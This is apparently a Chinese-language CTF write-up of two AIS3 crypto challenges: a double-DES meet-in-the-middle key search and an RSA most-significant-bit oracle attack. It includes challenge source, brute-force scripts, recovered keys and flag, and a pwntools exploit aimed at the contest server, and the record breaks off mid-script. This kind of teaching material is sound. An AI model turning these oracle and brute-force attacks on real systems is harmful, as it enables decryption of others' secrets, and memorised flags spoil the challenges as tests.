<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = <span class="built_in">require</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">&#x27;assert&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate key and IV</span></span><br><span class="line"><span class="keyword">const</span> key1 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> key2 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> iv = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;AIS3 三&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    key1[i] = key1[i] | <span class="number">0b11110000</span></span><br><span class="line">    key2[i] = key2[i] | <span class="number">0b11110000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">msg, key, iv</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> cipher = crypto.<span class="title function_">createCipheriv</span>(<span class="string">&#x27;des-cbc&#x27;</span>, key, iv)</span><br><span class="line">    <span class="keyword">let</span> encrypted = cipher.<span class="title function_">update</span>(msg)</span><br><span class="line">    encrypted = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([encrypted, cipher.<span class="title function_">final</span>()])</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">msg, key, iv</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> decipher = crypto.<span class="title function_">createDecipheriv</span>(<span class="string">&#x27;des-cbc&#x27;</span>, key, iv)</span><br><span class="line">    <span class="keyword">let</span> decrypted = decipher.<span class="title function_">update</span>(msg, <span class="string">&#x27;nyan~&#x27;</span>)</span><br><span class="line">    decrypted = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([decrypted, decipher.<span class="title function_">final</span>()])</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hint_pt = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;AIS3&#123;??????????&#125;&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(<span class="variable constant_">FLAG</span>, key1, iv), key2, iv)</span><br><span class="line">hint = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(hint_pt, key1, iv), key2, iv)</span><br><span class="line"></span><br><span class="line">assert.<span class="title function_">equal</span>(</span><br><span class="line">    <span class="title function_">decrypt</span>(<span class="title function_">decrypt</span>(res, key2, iv), key1, iv).<span class="title function_">toString</span>(<span class="string">&#x27;utf8&#x27;</span>),</span><br><span class="line">    <span class="variable constant_">FLAG</span>.<span class="title function_">toString</span>(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let res = &#x27;<span class="subst">$&#123;res.toString(<span class="string">&#x27;hex&#x27;</span>)&#125;</span>&#x27;`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint_pt = &#x27;<span class="subst">$&#123;hint_pt.toString(<span class="string">&#x27;hex&#x27;</span>)&#125;</span>&#x27;`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint = &#x27;<span class="subst">$&#123;hint.toString(<span class="string">&#x27;hex&#x27;</span>)&#125;</span>&#x27;`</span>)</span><br><span class="line"><span class="comment">// console.log(`let key1 = &#x27;$&#123;key1.toString(&#x27;hex&#x27;)&#125;&#x27;`)</span></span><br><span class="line"><span class="comment">// console.log(`let key2 = &#x27;$&#123;key2.toString(&#x27;hex&#x27;)&#125;&#x27;`)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let iv = &#x27;<span class="subst">$&#123;iv.toString(<span class="string">&#x27;hex&#x27;</span>)&#125;</span>&#x27;`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`</span></span><br><span class="line"><span class="string">    module.exports = &#123;</span></span><br><span class="line"><span class="string">        res: res,</span></span><br><span class="line"><span class="string">        hint: hint,</span></span><br><span class="line"><span class="string">        iv: iv,</span></span><br><span class="line"><span class="string">        hint_pt: hint_pt,</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span>)</span><br></pre></td></tr></table></figure>

<p>首先我們需要先造出一個所有key的list，在這裡我使用C++來進行IO加速。其中在解密的時候可以發現，前面4 bit因為特殊for迴圈的關係，固定會是1111，而且最後1 bit的數值1/0並不會影響到解密出來的東西，所以可以枚舉奇數就好，因此一位會產生$2^3=8$種可能，並一共會產生$8^8=16777216$種key，在可電腦窮舉的範圍內。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOS ios::sync_with_stdio(false);cin.tie(0);cout.tie(0);</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">IOS</span></span><br><span class="line"><span class="function">    ofstream <span class="title">MyFile</span><span class="params">(<span class="string">&quot;key.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> a=<span class="number">1</span>;a&lt;<span class="number">16</span>;a+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> b=<span class="number">1</span>;b&lt;<span class="number">16</span>;b+=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> c=<span class="number">1</span>;c&lt;<span class="number">16</span>;c+=<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> d=<span class="number">1</span>;d&lt;<span class="number">16</span>;d+=<span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> e=<span class="number">1</span>;e&lt;<span class="number">16</span>;e+=<span class="number">2</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> f=<span class="number">1</span>;f&lt;<span class="number">16</span>;f+=<span class="number">2</span>)&#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="type">int</span> g=<span class="number">1</span>;g&lt;<span class="number">16</span>;g+=<span class="number">2</span>)&#123;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="type">int</span> h=<span class="number">1</span>;h&lt;<span class="number">16</span>;h+=<span class="number">2</span>)&#123;</span><br><span class="line">                                    MyFile&lt;&lt;hex&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;a&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;b&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;c&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;d&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;e&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;f&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;g&lt;&lt;<span class="string">&quot;f&quot;</span>&lt;&lt;h&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MyFile.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// key.txt</span></span><br></pre></td></tr></table></figure>

<p>生成<code>key.txt</code>之後，我針對題目所給的<code>hint_pt</code>與<code>hint</code>分別進行加密與解密，並且儲存到<code>en.txt</code>與<code>de.txt</code>兩個檔案中。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> iv = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;AIS3 三&#x27;</span>)])</span><br><span class="line"><span class="keyword">let</span> hint_pt = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;414953337b3f3f3f3f3f3f3f3f3f3f7d&#x27;</span>,<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> hint = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;118cd68957ac93b269335416afda70e6d79ad65a09b0c0c6c50917e0cee18c93&#x27;</span>, <span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> inputStream = fs.<span class="title function_">createReadStream</span>(<span class="string">&#x27;key.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lineReader = readline.<span class="title function_">createInterface</span>(&#123; <span class="attr">input</span>: inputStream &#125;);</span><br><span class="line">lineReader.<span class="title function_">on</span>(<span class="string">&#x27;line&#x27;</span>, <span class="keyword">function</span>(<span class="params">line</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> key1 = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(line,<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">    k = <span class="title function_">encrypt</span>(hint_pt, key1, iv)</span><br><span class="line">    fs.<span class="title function_">appendFile</span>(<span class="string">&#x27;en.txt&#x27;</span>, key1.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>)+<span class="string">&#x27; &#x27;</span>+k.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>)+<span class="string">&#x27;\n&#x27;</span>, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">msg, key, iv</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> cipher = crypto.<span class="title function_">createCipheriv</span>(<span class="string">&#x27;des-cbc&#x27;</span>, key, iv)</span><br><span class="line">    <span class="keyword">let</span> encrypted = cipher.<span class="title function_">update</span>(msg)</span><br><span class="line">    encrypted = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([encrypted, cipher.<span class="title function_">final</span>()])</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// en.txt</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> iv = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;AIS3 三&#x27;</span>)])</span><br><span class="line"><span class="keyword">let</span> hint_pt = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;414953337b3f3f3f3f3f3f3f3f3f3f7d&#x27;</span>,<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> hint = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;118cd68957ac93b269335416afda70e6d79ad65a09b0c0c6c50917e0cee18c93&#x27;</span>, <span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> inputStream = fs.<span class="title function_">createReadStream</span>(<span class="string">&#x27;key.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lineReader = readline.<span class="title function_">createInterface</span>(&#123; <span class="attr">input</span>: inputStream &#125;);</span><br><span class="line">lineReader.<span class="title function_">on</span>(<span class="string">&#x27;line&#x27;</span>, <span class="keyword">function</span>(<span class="params">line</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> key2 = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(line,<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        k = <span class="title function_">decrypt</span>(hint, key2, iv)</span><br><span class="line">        <span class="keyword">if</span>(k.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>).<span class="property">length</span> &lt; <span class="number">50</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(key2.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>), k.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        fs.<span class="title function_">appendFile</span>(<span class="string">&#x27;de.txt&#x27;</span>, key2.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>)+<span class="string">&#x27; &#x27;</span>+k.<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>)+<span class="string">&#x27;\n&#x27;</span>, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">msg, key, iv</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> decipher = crypto.<span class="title function_">createDecipheriv</span>(<span class="string">&#x27;des-cbc&#x27;</span>, key, iv)</span><br><span class="line">    <span class="keyword">let</span> decrypted = decipher.<span class="title function_">update</span>(msg, <span class="string">&#x27;nyan~&#x27;</span>)</span><br><span class="line">    decrypted = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([decrypted, decipher.<span class="title function_">final</span>()])</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// de.txt</span></span><br></pre></td></tr></table></figure>

<p>兩個分別生成到一半時因為我的電腦效能太差，且nodejs的輸出效率太慢了，所以我就把它們截斷，幸運的是在裡面找到了相同的中間密文<code>0015f807fa38ef42050da63c7100bc0f19c299aaa0323928</code>，而對應到的key1是<code>f5f1fbfff1fdf5f5</code>，key2則是<code>f7f9f9fff7fbf5f5</code>。拿著這兩把key去對原本的flag密文做解密即可拿到flag。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> key1 = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;f5f1fbfff1fdf5f5&#x27;</span>,<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> key2 = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;f7f9f9fff7fbf5f5&#x27;</span>,<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> iv = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;AIS3 三&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    key1[i] = key1[i] | <span class="number">0b11110000</span></span><br><span class="line">    key2[i] = key2[i] | <span class="number">0b11110000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">msg, key, iv</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> decipher = crypto.<span class="title function_">createDecipheriv</span>(<span class="string">&#x27;des-cbc&#x27;</span>, key, iv)</span><br><span class="line">    <span class="keyword">let</span> decrypted = decipher.<span class="title function_">update</span>(msg, <span class="string">&#x27;nyan~&#x27;</span>)</span><br><span class="line">    decrypted = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([decrypted, decipher.<span class="title function_">final</span>()])</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res=<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;6020e9735ca3bf2f63aebcf3622c994880ffed2b509c91414c75d4c500ee80f4&#x27;</span>,<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">decrypt</span>(<span class="title function_">decrypt</span>(res, key2, iv), key1, iv).<span class="title function_">toString</span>(<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>AIS3&#123;折半枚舉&#125;</code></p>
<h2 id="MSB-Oracle-Attack-499"><a href="#MSB-Oracle-Attack-499" class="headerlink" title="MSB Oracle Attack [499]"></a>MSB Oracle Attack [499]</h2><div class="note default flat"><p>We all know RSA LSB oracle, but do you know MSB oracle?</p>
<p>Author: toxicpie</p>
<p><code>nc chals1.ais3.org 12347</code></p>
</div>
<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/15KSYACFO3m1NWoL_Yb33G-fBtzd17jvx/view?usp=sharing">https://drive.google.com/file/d/15KSYACFO3m1NWoL_Yb33G-fBtzd17jvx/view?usp=sharing</a></p>
</blockquote>
<p>先來看看source code。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Your key: <span class="subst">&#123;<span class="built_in">hex</span>(n)&#125;</span> <span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">secret = random.randrange(n)</span><br><span class="line">hint = <span class="built_in">pow</span>(secret, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Your hint: <span class="subst">&#123;<span class="built_in">hex</span>(hint)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1500</span>):</span><br><span class="line">    ct = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;The ciphertext? &#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> ct == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">    <span class="keyword">if</span> pt &gt; n // <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your plaintext is big&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your plaintext is small&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;The secret? &#x27;</span>) == <span class="built_in">hex</span>(secret):</span><br><span class="line">    flag = os.environ[<span class="string">&#x27;FLAG&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Your flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No flag&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>這題題目提到LSB oracle，可以發現與本題的想法很像，題敘從原本LSB的奇偶轉換成$\dfrac{n}{2}$，不過很快就可以發現利用大於$\dfrac{n}{2}$與小於$\dfrac{n}{2}$的條件，搭配密文輸入</p>
<p>$hint\times(2^{power})^e=(secret\times 2^{power})^e$</p>
<p>，這時解密後會出現</p>
<p>$secret\times 2^{power}&gt;\dfrac{n}{2}\implies secret&gt;\dfrac{n}{2^{power+1}}$或</p>
<p>$secret\times 2^{power}&lt;\dfrac{n}{2}\implies secret&lt;\dfrac{n}{2^{power+1}}$</p>
<p>兩種情況，就可以作為二分搜的條件，來限縮secret的值，最後在1500次內找到趨近真實的secret，可以直接寫二分搜的exploit拿到flag。</p>
<p>不過在二分搜時，因為我所使用的是整除的二分搜，因此在最後的secret上會有小於10000的誤差，這時我利用for loop窮舉來判斷加密後的結果是否與給定的hint一致，就可以確定secret的值。輸入0跳出並輸入secret後就可以拿到flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;chals1.ais3.org&#x27;</span>,<span class="number">12347</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">k=r.recvline().strip().decode().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">n=<span class="built_in">int</span>(k[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">e=<span class="built_in">int</span>(k[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">k=r.recvline().strip().decode()</span><br><span class="line">c=<span class="built_in">int</span>(k,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">pwr=<span class="number">0</span></span><br><span class="line">lr=[<span class="number">0</span>,n]</span><br><span class="line"><span class="keyword">while</span>(flag&lt;<span class="number">1500</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;? &#x27;</span>)</span><br><span class="line">    payload=<span class="built_in">hex</span>((c*((<span class="number">2</span>**pwr)**e))%n)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    k=r.recvline()</span><br><span class="line">    <span class="built_in">print</span>(k)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;small&#x27;</span> <span 